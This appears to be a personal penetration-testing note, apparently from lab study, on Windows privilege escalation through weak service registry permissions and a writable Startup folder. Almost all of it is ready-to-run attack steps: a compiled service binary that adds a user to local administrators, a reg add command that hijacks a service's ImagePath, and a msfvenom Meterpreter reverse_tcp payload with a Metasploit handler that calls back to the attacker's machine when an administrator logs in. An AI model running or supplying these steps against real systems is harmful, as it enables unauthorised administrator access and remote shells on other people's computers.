---
title: Service Startup / Startup Applications
updated: 2023-10-10 11:11:59Z
created: 2023-10-03 02:12:38Z
latitude: -35.28093680
longitude: 149.13000920
altitude: 0.0000
---

# Service escalation
Check permissions on targeted service under registry key **HKLM\SYSTEM\CurrentControlSet\Services**

1. `Get-Acl -Path hklm:\System\CurrentControlSet\services\<service> | fl`
2. Check if anyone has FULL PERMISSION
3. Compile an executable to run commands (eg add users to local administrators group)
Open **windows_service.c** and replace the command used by the system() function to: `cmd.exe /k net localgroup administrators <user> /add`
4. `x86_64-w64-mingw32-gcc windows_service.c -o file.exe`
5. Update registry service with parth of executable (file.exe)
 `reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d c:\temp\file.exe /f`
 Start service
 6. `sc start <service>`

# Startup Applications
Check ACL's on Startup folder
1 `icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"`
2. Look for FULL ACCESS

## Exploitation

**Kali VM**

1. `msfconsole`
2. `use multi/handler`
3. `set payload windows/meterpreter/reverse_tcp`
4. `set lhost [Kali VM IP Address]`
5. `run`
Create payload:
6. `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o file.exe`
7. Copy the **file.exe**, to the Windows target.

**Windows target**

1. Place **file.exe** in **“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.**
2. Logoff.
3. Login with the administrator account credentials.

**Kali VM**

1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter > prompt) type: `getuid`
***
